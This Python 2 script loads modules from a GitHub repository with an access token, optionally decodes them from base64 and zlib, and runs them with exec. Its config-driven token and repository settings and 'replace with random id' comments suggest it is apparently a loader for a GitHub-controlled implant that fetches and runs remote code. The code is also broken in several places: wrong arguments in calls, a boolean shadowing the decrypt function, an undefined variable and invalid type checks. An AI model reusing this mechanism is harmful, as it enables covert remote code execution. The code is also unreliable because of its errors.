#loads modules and packages from github
#takes options on run:
#load - list of modules/packages to load (required)
#decrypt - boolean, true if files need to be decrypted, false otherwise (optional, default is false)
#repo - repo to look in (str or list corresponding to module list, optional, default is config file)
#usr - username of repo owner (str or list corresponding to module list, optional, default is config file)
#dir - directory to search (str or list corresponding to module list, optional, default is config file)

import sys
import imp
import base64
import zlib
from github3 import login

#decrypted = zip(base64(data))
def decrypt(data):
        decoded = base64.b64decode(data)
	uzip = zlib.decompress(decoded)
        return uzip

#searches for module files, from path provided
def search_file(fullname, repo, usr, search, tk, decrypt):
	gh = login(token = tk)
        repo = gh.repository(usr, repo)
        cont = repo.directory_contents(search)
        for fn, c in cont:
                if "dir" in c.type:
			#recursive depth first search to find file
                        s = search_file(fullname, c.path)
                        if s is not None:
                                return s
                        else:
                                continue
		#get file or __init__ file iin case of package
                if fullname in fn or (fullname in c.path and "__init__" in fn):
			if decrypt:
                        	return decrypt(repo.file_contents(c.path).decoded)
			else:
				return repo.file_contents(c.path).decoded
        return None

#returns handle to module (such as with "import module as name")
def my_load(fullname, repo, usr, dir, tk, decrypt):
	try:
		#return module if its already loaded
		return sys.modules[fullname]
	except:
		pass
        name = fullname.split(".")
        pathname = dir
        modname = ""
	#iteratively load package/subpackage/module (dot syntax)
        for mod in name:
                if modname:
                        modname = modname + "." + mod
                else:
                        modname = mod
		#get file contents
                contents = search_file(mod, repo, usr, pathname, decrypt)
                if not contents:
                        return None
                try:
			#load module
			n_mod = imp.new_module(modname)
			exec contents in n_mod.__dict__
                        sys.modules[modname] = n_mod
		except:
			return None
        return sys.modules[fullname]

def run(config, **args):
	#load options
	repo_l = None
	usr_l = None
	dir_l = None
	try:
		to_load = args["load"]
	except:
		return None, None
	try:
		decrypt = args["decrypt"]
	except:
		decrypt = False
	try:
		if "str" in type(args["repo"]):
			repo = args["repo"]
		else:
			repo_l = args["repo"]
	except:
		repo = config.g_repo() #replace with random id
	try:
		if "str" in type(args["usr"]):
			usr = args["usr"]
		else:
			usr_l = args["usr"]
	except:
		usr = config.g_usr() #replace with random id
	try:
		if "str" in type(args["dir"]):
			dir = args["dir"]
		else:
			dir_l = args["dir"]
	except:
		dir = config.g_mod()[:-1] #replace with random id
	try:
		tk = args["tk"]
	except:
		tk = config.g_token() #replace with random id
	#main
	loaded = "loaded: "
	for module in to_load:
		try:
			if repo_l:
				repo = repo_l.pop(0)
			if usr_l:
				usr = usr_l.pop(0)
			if dir_l:
				dir = dir_l.pop(0)
			if pwd_l:
				pwd = pwd_l.pop(0)
			if my_load(str(module), repo, usr, dir, tk, decrypt):
				loaded = loaded + str(module) + ", "
		except:
			pass
	return None, loaded
